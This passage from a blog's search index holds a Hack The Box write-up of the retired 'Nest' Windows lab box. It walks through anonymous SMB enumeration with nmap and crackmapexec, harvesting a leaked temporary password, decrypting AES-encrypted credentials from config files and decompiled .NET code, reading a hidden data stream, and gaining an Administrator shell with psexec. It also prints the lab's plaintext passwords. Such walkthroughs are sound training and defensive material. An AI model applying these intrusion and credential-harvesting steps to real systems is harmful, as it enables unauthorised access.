Level: Medium | Creators: egre55 | Released: January 11th, 2020 | Retired: June 13th, 2020 | Difficulty: 4.8/10 | Appreciation: 4.3/5","id":5,"section":"posts","tags":["ldap_anonymous_bind","default_password","azure_ad_connect"],"title":"Hack The Box :: Monteverde","uri":"https://noobintheshell.com/posts/htb_monteverde/"},{"content":"  Nest is an Easy Windows box created by VbScrub. It was released on January 25th, 2020 and retired on June 5th, 2020. The users rated the difficulty 5.2/10 and gave an appreciation score of 4/5.\nNest Info Card   TL;DR We access some SMB shares anonymously and retrieve an HR email template containing a temporary user password. We have more accesses with that user and can read a bunch of XML configuration files in the IT share. They leak the encrypted password of the user C.Smith as well as a subfolder of the share Secure$. We mount that subfolder and retrieve the source code of a custom application RU Scanner that reads the config file with the encrypted password. The password is encrypted with AES256-CBC and uses PBKDF2 to derive the key from a passphrase. We decrypt the user password and retrieve the user flag from the Users/C.Smith shared folder. There is a custom service running as well. It allows us to explore the file system and read files if we have the password to enable the debug mode. We find an empty file in C.Smith folder that contains the debug password in its extended attributes (or streams). We activate the debug mode in the service and read one of the config files that leaks the encrypted password of the Administrator. We found as well a binary used by the service in C.Smith folder. We decompile it (.NET) and see that the same encryption scheme is used again. We decrypt the Administrator password and get a shell with psexec to retrieve the root flag.\nReconnaissance \u0026amp; Enumeration Open Ports An NMAP scan shows the following (partial) output:\n$ sudo nmap -sS -sV -sC -p- 10.10.10.178\n   PORT STATE  SERVICE VERSION     445/tcp open microsoft-ds?    4386/tcp  open unknown      We discover the SMB port open as well as an unknown service on port 4386, probably a custom service.\nSMB discovery Anonymous access is enabled and we can list the available shares with crackmapexec:\ncrackmapexec smb 10.10.10.178 -u ‘xxx’ -p ‘’ — shares   We have read access to 2 shares: Data and Users. The Users share contains some user folders but they are not accessible anonymously:\nUsers share content   The Data share contains some IT folders and only the Shared subfolder is accessible:\nData share content   The full content of the Shared folder is:\nShared\n\u0026ndash; Maintenance\n\u0026ndash; Maintenance Alerts.txt\n\u0026ndash; Templates\n\u0026ndash; HR\n\u0026ndash; Welcome Email.txt\n\u0026ndash; Marketing We retrieve the 2 text files. The first one does not contain anything useful:\nThere is currently no scheduled maintenance work The HR file contains:\nWe would like to extend a warm welcome to our newest member of staff, \u0026lt;FIRSTNAME\u0026gt; \u0026lt;SURNAME\u0026gt;\nYou will find your home folder in the following location:\n\\HTB-NEST\\Users\u0026amp;lt;USERNAME\u0026gt;\nIf you have any issues accessing specific services or workstations, please inform the IT department and use the credentials below until all systems have been set up for you.\nUsername: TempUser\nPassword: welcome2019\nThank you\nHR\n It leaks a temporary user credentials. With this account, we can read a new share Secure$:\ncrackmapexec smb 10.10.10.178 -u TempUser -p welcome2019 — shares   On top of that, we have as well access to Users/TempUser that contains a unique file New Text Document.txt but it is empty. Back to the Secure$ share. It contains 3 folders: Finance, HR and IT but we can’t read their content. However, Data/IT is now accessible and contains multiples files. Let’s mount it:\n$ mkdir Data\n$ mount_smbfs //TempUser@10.10.10.178/Users ./Data We discover a bunch of XML config files in Data/IT/Configs. A config file contains credentials information. It is related to an app called RU Scanner:\nData/IT/Configs/RU Scanner/RU_config.xml   We saw a folder C.Smith previously in the Users share. If we base64-decode the password we don’t get much, so probably this is an encrypted or hashed password. We can recover the bytes:\n$ echo -n \u0026quot;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\u0026quot; | base64 -D | xxd -p\n7d313301f603a33d58ce4aa14241fa1901582a9d57639866edb8ce3fceb26311 It is 256 bit so our first guess is either it is a SHA256 hash or an AES256 encrypted password.\nIn NotepadPlusPlus/config.xml, we find the file history of the user C.Smith:\n\u0026lt;History nbMaxFile=\u0026quot;15\u0026quot; inSubMenu=\u0026quot;no\u0026quot; customLength=\u0026quot;-1\u0026quot;\u0026gt;\n\u0026lt;File filename=\u0026quot;C:\\windows\\System32\\drivers\\etc\\hosts\u0026quot; /\u0026gt;\n\u0026lt;File filename=\u0026quot;\\HTB-NEST\\Secure$\\IT\\Carl\\Temp.txt\u0026quot; /\u0026gt;\n\u0026lt;File filename=\u0026quot;C:\\Users\\C.Smith\\Desktop\\todo.txt\u0026quot; /\u0026gt;\n\u0026lt;/History\u0026gt; It leaks a file and a subfolder of the Secure$ share.\nPort 4386 This is a custom reporting service that we can access with telnet. It does not work with nc, not even with the -T flag to use telnet negotiation…not sure why.\nWe guess the Help command:\nHQK Reporting Service   We can explore the available commands. LIST seems to list the files and folders in the current folder:\nQUERY FILES IN CURRENT DIRECTORY\n   [DIR]  COMPARISONS     [1] Invoices (Ordered By Customer)   [2] Products Sold (Ordered By Customer)   [3] Products Sold In Last 30 Days     We should be able to use RUNQUERY to run queries with a query ID as argument. However, running RUNQUERY 1, 2 or 3 does not work.\nWe can use the SETDIR command as we use cd to move in the file system:\nSETDIR command   Running HELP LIST shows another command SHOWQUERY which supposedly can read the content of a file, however, we need to be in DEBUG mode and it requires a password.\nGaining Access We do not have access to any folder of the Secure$ share with our TempUser access rights. However, we can mount and read the subfolder we found earlier Secure$\\IT\\Carl:\n$ mkdir Secure\n$ mount_smbfs //TempUser@10.10.10.178/Secure$/IT/Carl ./Secure/ In there, we access a VB Projects/WIP/RU folder that contains the source code of RU Scanner. We might find out how C.Smith password in the config file was encrypted or hashed.\nThe Main function in Module1.vb is quite empty. It loads the config file, reads the username and decrypts the password:\nModule1.vb   The DecryptString function is found in Utils.vb:\nUtils.vb — DecryptString()   It calls the Decrypt function with the encryption scheme parameters. The function signature explains those value:\nUtils.vb — Decrypt() signature   The code shows that the encryption used is AES256 in CBC mode:\nUtils.vb — Decrypt() — AES-CBC   And that the AES key is derived from the passphrase using PBKDF2:\nUtils.vb — Decrypt() — PBKDF2   As per Microsoft documentation, Rfc2898DeriveBytes uses HMACSHA1.\nWe have all the necessary parameters to decrypt the password. We can use CyberChef as follows. First, we get the AES256 key:\nCyberChef — PBKDF2   Then we use this key to decrypt the password:\nCyberChef — AES Decrypt   The credentials are then c.smith:xRxRxPANCAK3SxRxRx. We can mount his user folder:\n$ mount_smbfs //c.smith@10.10.10.178/Users/C.Smith ./Users We get the user flag in there:\n$ cat Users/user.txt\ncf71************************e987 Privilege Escalation Along with the user flag, we find a folder HQK Reporting that contains an executable file called HqkLdap.exe in a subfolder called AD Integration Module. We get as well a strange empty file called Debug Mode Password.txt:\nUsers/C.Smith/HQK Reporting   The @ sign next to the permissions indicates that the file has extended attributes. We can use ls -l@ to list the file attributes, and xattr -l to list the attributes and values:\nfile extended attributes   On Windows, this is known as an Alternate Data Stream (ADS). We can list the streams with _Get-Item -Path %file% -Stream *_ and retrieve the content of a stream with _Get-Content -Path %file% -Stream %name%_.  I found out after posting that Microsoft created ADS to support Mac HFS streams and allow Mac users to store files on Windows shares. This is the reason why we were able to use native commands on macOS to extract this data. This wouldn’t have been possible on ext4 partitions for instance:  Source: MCITP: Microsoft Windows Vista Desktop Support Consumer Study Guide: Exam 70–623   Now that we have the debug password, we can resume the exploration of the HQK Reporting Service. Once the debug mode activated we have access to more commands:\nDEBUG mode enabled   SERVICES and SESSION just show information about the running process and session. The only useful information is the current folder. We start in C:\\Program Files\\HQK\\ALL QUERIES. We can change directories with SETDIR and find HqkLdap.exe (that we retrieved previously) and Ldap.conf in C:\\Program Files\\HQK\\LDAP. We can read the config file with SHOWQUERY:\nC:\\Program Files\\HQK\\LDAP\\Ldap.conf   This looks again like an encrypted password, this time for the Administrator account. We can probably decrypt it by analyzing HqkLdap.exe.\nThe executable is a .NET PE32 file:\n$ file HqkLdap.exe\nHqkLdap.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows We can decompile the code with tools like dotPeek. And it is clear that the encryption scheme is exactly the same as the one in RU Scanner:\nCR.cs — DS()   CR.cs — RD()   Back to CyberChef for the decryption. We first get the AES256 key:\nCyberChef — PBKDF2   Then decode the encrypted password and decrypt it:\n$ echo \u0026quot;yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=\u0026quot; | base64 -D | xxd -p\ncb212ad14bef86adae40e7161bca5e2e879141e86a8a9fdf29d786fe48c455be CyberChef — AES Decrypt   With the Administrator password. we can use psexec to get a shell and the root flag:\nroot flag   Conclusion This was an easy box but more in the CTF style in my opinion. The only difficulty was to find out the hidden debug password.\nHere are some takeaways:\n always enforce SMB authentication, disable SMBv1, enable SMB signing and encryption if possible, enforce a strong password policy, review access rights periodically and grant them according to need-to-know and least privilege principles.  Resources [1] PBKDF2\nhttps://en.wikipedia.org/wiki/PBKDF2\nhttps://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.rfc2898derivebytes?view=netframework-4.8\n[2] CyberChef\nhttps://gchq.github.io/CyberChef/\n[3] Alternate Data Streams\nhttps://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/\n[4] dotPeek .NET decompiler\nhttps://www.jetbrains.com/decompiler/\n","description":"","id":6,"section":"posts","tags":["xattr","ads","vb.net","aes-cbc","pbkdf2"],"title":"Hack The Box :: Nest","uri":"https://noobintheshell.com/posts/htb_nest/"},{"content":"This page is just a placehpolder, so the url /search is reachable\n","description":"","id":7,"section":"","tags":null,"title":"","uri":"https://noobintheshell.com/search/"}]